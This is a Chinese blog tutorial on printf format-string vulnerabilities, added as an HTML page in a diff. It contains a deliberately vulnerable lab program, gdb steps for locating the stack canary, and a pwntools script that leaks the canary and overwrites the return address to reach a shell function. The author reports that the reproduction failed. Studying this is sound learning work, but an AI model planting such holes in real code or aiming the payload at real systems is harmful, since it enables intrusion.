@@ -1,0 +1,824 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="尝试第一次攻击，此处利用的是格式化字符串漏洞，只是有一点初步的了解，在之后的文章会进行更加深入的学习">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从0开始学Pwn-4.printf漏洞概述及利用">
+<meta property="og:url" content="http://example.com/2022/06/21/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6Pwn-4.printf%E6%BC%8F%E6%B4%9E%E5%8F%8A%E7%AA%81%E7%A0%B4%E6%A0%88%E4%BF%9D%E6%8A%A4/index.html">
+<meta property="og:site_name" content="Csc8&#39;s">
+<meta property="og:description" content="尝试第一次攻击，此处利用的是格式化字符串漏洞，只是有一点初步的了解，在之后的文章会进行更加深入的学习">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2022/06/21/fo3B64MTC9OxjUY.png">
+<meta property="og:image" content="https://s2.loli.net/2022/06/21/ei71hAIJvTrtKkB.png">
+<meta property="og:image" content="https://s2.loli.net/2022/06/21/rTV5dhUa8NMp16k.png">
+<meta property="og:image" content="https://s2.loli.net/2022/06/21/geDXQBCviRIKaun.png">
+<meta property="og:image" content="https://s2.loli.net/2022/06/21/VSj4kIDHmUtgBQ8.png">
+<meta property="og:image" content="https://s2.loli.net/2022/06/21/idNbR1yK9OTLFwj.png">
+<meta property="article:published_time" content="2022-06-21T08:53:11.398Z">
+<meta property="article:modified_time" content="2022-06-21T09:07:23.326Z">
+<meta property="article:author" content="csc8">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/06/21/fo3B64MTC9OxjUY.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2022/06/21/从0开始学Pwn-4.printf漏洞及突破栈保护/"/>
+
+
+
+
+
+  <title>从0开始学Pwn-4.printf漏洞概述及利用 | Csc8's</title>
+  
+
+
+
+
+
+
+
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/clicklove.js"></script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Csc8's</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">苍松翠柏</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/21/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6Pwn-4.printf%E6%BC%8F%E6%B4%9E%E5%8F%8A%E7%AA%81%E7%A0%B4%E6%A0%88%E4%BF%9D%E6%8A%A4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/%5Bobject%20Object%5D">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Csc8's">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">从0开始学Pwn-4.printf漏洞概述及利用</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-06-21T16:53:11+08:00">
+                2022-6-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>尝试第一次攻击，此处利用的是格式化字符串漏洞，只是有一点初步的了解，在之后的文章会进行更加深入的学习</p>
+<span id="more"></span>
+
+
+
+
+
+
+
+<h3 id="1-格式化字符串"><a href="#1-格式化字符串" class="headerlink" title="1.格式化字符串"></a>1.格式化字符串</h3><p><strong>常见输出函数：</strong></p>
+<p>printf,fprintf,vprintf,vfprintf,sprintf</p>
+<p>Format String是其第一个参数，此为格式化字符串</p>
+<p><strong>格式化字符串解析</strong></p>
+<p>printf接受的变长参数，第一个为格式化字符串，后面的参数在运行时和格式化字符串中特定格式的子字符串对应，将特定子串，解析成对应的参数值</p>
+<h3 id="2-格式化字符串漏洞"><a href="#2-格式化字符串漏洞" class="headerlink" title="2.格式化字符串漏洞"></a>2.格式化字符串漏洞</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>printf函数执行时，先解析格式化字符串–从栈（或寄存器）获取参数并与符号说明进行匹配，再将匹配结果输出到屏幕。</p>
+<p>当符号和栈上参数不匹配时，如参数少于符号，就可能造成泄露</p>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><h5 id="使程序崩溃"><a href="#使程序崩溃" class="headerlink" title="使程序崩溃"></a>使程序崩溃</h5><p>格式化字符串漏洞通常要在程序崩溃时才会被发现，所有利用格式化字符串漏洞最简单的方式就是使进程崩溃。在linux中，存储无效的指针会引起进程收到SIGSEGV信号，从而使程序非正常终止并产生核心存储。我们找到核心存储中存储了程序崩溃时的许多重要信息，这些信息或是后续攻击利用的关键。</p>
+<p>利用类似下面的格式化字符串即可触发漏洞：</p>
+<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;<span class="variable">%s%</span>s<span class="variable">%s%</span>s<span class="variable">%s%</span>s<span class="variable">%s%</span>s<span class="variable">%s%</span>s<span class="variable">%s%</span>s<span class="variable">%s%</span>s%s&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>1、对于每一个%s，printf（）都要从栈中获取一个数字，把该数字视为一个地址，然后打印地址指向的内存内容，直到出现一个null字符。<br>2、因为不可能获取的每一个数字都是地址，数字所对应的内存可能并不存在。<br>3、还有可能获得的数字确实是一个地址，但是该地址是被保护的。</p>
+<h5 id="查看栈内容"><a href="#查看栈内容" class="headerlink" title="查看栈内容"></a>查看栈内容</h5><p>使程序崩溃只是进行验证了漏洞，我们还能利用格式化漏洞来获得内存的内容。<br>格式化字符串函数会根据格式字符串从栈上取值。由于32位系统上栈是由高地址向低地址增长，而printf（）函数的参数是以逆序被压入栈的，所以参数在内存中出现的顺序在printf（）调用时的顺序是一样的。</p>
+<h5 id="覆写栈内容"><a href="#覆写栈内容" class="headerlink" title="覆写栈内容"></a>覆写栈内容</h5><p>1、%n 转换指示符将 %n 当前已经成功写入流或缓冲区中的字符个数存储到地址由参数指定的整数中。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="type">char</span> str[]=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s %n\n&quot;</span>,str,&amp;i);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,i);</span><br><span class="line">&#125;</span><br><span class="line">out: hello\n <span class="number">6</span></span><br></pre></td></tr></table></figure>
+
+<p>通常情况下，我们要需要覆写的值是一个 shellcode 的地址，而这个地址往往是一个很大的数字。这时我们就需要通过使用具体的宽度或精度的转换规范来控制写入的字符个数，即在格式字符串中加上一个十进制整数来表示输出的最小位数，如果实际位数大于定义的宽度，则按实际位数输出，反之则以空格或 0 补齐（0 补齐时在宽度前加点. 或 0）。如：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%10u%n\n&quot;</span>,i,&amp;i);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,i);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%.50u%n\n&quot;</span>,i,&amp;i);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,i);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%0100u%n\n&quot;</span>,i,&amp;i);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-理解printf函数"><a href="#3-理解printf函数" class="headerlink" title="3.理解printf函数"></a>3.理解printf函数</h3><h4 id="gdb调试-调试程序3"><a href="#gdb调试-调试程序3" class="headerlink" title="gdb调试(调试程序3)"></a>gdb调试(调试程序3)</h4><p>在上一篇内容中进行过介绍，所以在这只分析printf函数上下中内容</p>
+<p>部分内容，通过IDA获得</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">11-16：main中代码内容</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">mov  [ebp+var_10], offset aRoger ; <span class="string">&quot;Roger&quot;</span></span></span><br><span class="line">mov    DWORD PTR [ebp-0x10],0x8048540</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">开辟0xc的空间</span></span><br><span class="line">sub    esp,0xc</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">push    offset format   ; <span class="string">&quot;My name is %s&quot;</span></span></span><br><span class="line">push   0x8048546</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">call    _printf</span></span><br><span class="line">call   0x8048330 &lt;printf@plt&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">释放0x10空间，0x10是16字节，释放四行栈帧空间</span></span><br><span class="line">add    esp,0x10</span><br><span class="line">mov    eax,0x0</span><br></pre></td></tr></table></figure>
+
+<p>call printf时，因为后面没有参数，所以会取esp+0x4的数据，进行执行</p>
+<p><img src="https://s2.loli.net/2022/06/21/fo3B64MTC9OxjUY.png" alt="pwn13.PNG"></p>
+<p><strong>如果要利用，尝试在esp+0x4处输入其他数据</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set *(0xffffd664)=0x8048540</span><br></pre></td></tr></table></figure>
+
+<p>printf输出：My name is Roger</p>
+<p>原本的输出：My name is (Null)</p>
+<h4 id="gdb调试-调试程序printf1-c"><a href="#gdb调试-调试程序printf1-c" class="headerlink" title="gdb调试(调试程序printf1.c)"></a>gdb调试(调试程序printf1.c)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">0x20</span>];</span><br><span class="line">    read(<span class="number">0</span>,str,<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Csc8 %s&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查看寄存器</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">lea eax,[ebp-0x2c]</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看其数据</span></span><br><span class="line">x $ebp-0x2c</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="4-利用printf漏洞突破Canary保护（复现失败）"><a href="#4-利用printf漏洞突破Canary保护（复现失败）" class="headerlink" title="4.利用printf漏洞突破Canary保护（复现失败）"></a>4.利用printf漏洞突破Canary保护（复现失败）</h3><p>printf2.c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">exploit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">0x20</span>];</span><br><span class="line">    read(<span class="number">0</span>, str, <span class="number">0x50</span>);</span><br><span class="line">    <span class="built_in">printf</span>(str);</span><br><span class="line">    read(<span class="number">0</span>, str, <span class="number">0x50</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    func();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译,不加pie保护，加canary保护</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -no-pie -fstack-protector-all -o printf2 printf2.c</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>利用printf函数，将其返回地址改为exploit函数地址</strong></p>
+<h4 id="gdb调试-printf2-c"><a href="#gdb调试-printf2-c" class="headerlink" title="gdb调试(printf2.c)"></a><strong>gdb调试(printf2.c)</strong></h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">总命令过程，下面有每步的目的和分析</span></span><br><span class="line">gdb printf2</span><br><span class="line">disass func</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>关注三个东西：</strong></p>
+<h5 id="1-1-栈顶到canary的偏移地址（行数）"><a href="#1-1-栈顶到canary的偏移地址（行数）" class="headerlink" title="1-1.栈顶到canary的偏移地址（行数）"></a>1-1.栈顶到canary的偏移地址（行数）</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">反汇编func函数</span></span><br><span class="line">disass func</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">先观察各个函数，将func汇编分段</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">找到canary保护的位置</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第一段的四五行</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">目的：利用<span class="built_in">printf</span>泄露canary的地址</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/06/21/ei71hAIJvTrtKkB.png" alt="pwn14.PNG"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">断点打在<span class="built_in">printf</span>函数处</span></span><br><span class="line">b *0x0804852b</span><br><span class="line">r</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">进入<span class="built_in">printf</span>前，有一个<span class="built_in">read</span>函数</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">所以需要键入数据</span></span><br><span class="line">csc</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">printf</span>会输出，键入的信息</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">因为<span class="built_in">printf</span>中没有正确的格式</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">format会输出信息，而vararg会默认输出esp+4</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/06/21/rTV5dhUa8NMp16k.png" alt="pwn15.PNG"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">利用x命令查看canary值</span></span><br><span class="line">x $ebp-0xc</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看堆栈,00-28</span></span><br><span class="line">stack 0x24</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">计算esp到canary的行数，一行为4字节</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">(003c-0000)/4 = 15行</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/06/21/geDXQBCviRIKaun.png" alt="pwn17.PNG"></p>
+<p><img src="https://s2.loli.net/2022/06/21/VSj4kIDHmUtgBQ8.png" alt="pwn16.PNG"></p>
+<h5 id="1-2-格式化漏洞常用符号"><a href="#1-2-格式化漏洞常用符号" class="headerlink" title="1-2.格式化漏洞常用符号"></a>1-2.格式化漏洞常用符号</h5><p><strong>%p</strong> :  将对应参数解析为地址形式输出</p>
+<p>%k$p :  将更改对应顺序，与格式化字符串后的第k个参数进行对应，并以地址形式解析参数</p>
+<p><strong>%k$n</strong> :   将与格式化字符串后的第k个参数进行对应，将参数解析成一个地址，并取消此次输出，再将已输出的字节长度写入获取的地址</p>
+<h5 id="2-利用printf泄露canary的地址"><a href="#2-利用printf泄露canary的地址" class="headerlink" title="2.利用printf泄露canary的地址"></a>2.利用printf泄露canary的地址</h5><p>目的：令printf输出偏移量为15行的7位十六进制地址</p>
+<p><img src="https://s2.loli.net/2022/06/21/idNbR1yK9OTLFwj.png" alt="pwn18.PNG"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">写入</span></span><br><span class="line">r</span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">15<span class="variable">$08x</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">步进</span></span><br><span class="line">n</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">printf</span>输出的是canary值</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">检查canary值是否是</span></span><br><span class="line">stack 0x28</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="3-ret的返回地址"><a href="#3-ret的返回地址" class="headerlink" title="3.ret的返回地址"></a>3.ret的返回地址</h5><h4 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a><strong>编写exp</strong></h4><p><strong>实现突破canary保护且覆盖ret</strong></p>
+<p>exp1.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./printf2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#canary偏移地址，计算输入的地址位置到原本的位置，8行</span></span><br><span class="line">canary_offset = <span class="number">8</span>*<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取canary信息</span></span><br><span class="line">p.sendline(<span class="string">&quot;%15$08x&quot;</span>) <span class="comment">#默认有回车</span></span><br><span class="line">canary = p.recv()[:<span class="number">8</span>] <span class="comment">#去掉回车</span></span><br><span class="line"><span class="built_in">print</span> canary</span><br><span class="line"></span><br><span class="line"><span class="comment">#处理cannary信息</span></span><br><span class="line">canary = canary.decode(<span class="string">&quot;hex&quot;</span>)[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#main函数返回偏移地址</span></span><br><span class="line">ret_offset = <span class="number">3</span>*<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#exploit地址</span></span><br><span class="line">exploit_address= p32(<span class="number">0x080484e6</span>)  </span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*canary_offset + canary + <span class="string">&#x27;a&#x27;</span>*ret_offset + exploit_address</span><br><span class="line"></span><br><span class="line"><span class="comment">#在第二个read时，将其发送</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>脚本是一步一步调出来的，一次不能成功也无所谓</p>
+<h3 id="5-建议"><a href="#5-建议" class="headerlink" title="5.建议"></a>5.建议</h3><p><strong>自己动手调试之前的所有程序，并进行阅读</strong></p>
+<p>printf漏洞，可以作为后续学习的内容暂时跳过</p>
+<p>拓展：[看雪格式化字符串漏洞简介][<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-253638.htm]">https://bbs.pediy.com/thread-253638.htm]</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/06/21/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6Pwn-3.Canary%E5%AE%9E%E4%BE%8B%E5%8F%8AGdb%E8%B0%83%E8%AF%95/" rel="next" title="从0开始学Pwn-3.Canary实例及Gdb调试">
+                <i class="fa fa-chevron-left"></i> 从0开始学Pwn-3.Canary实例及Gdb调试
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
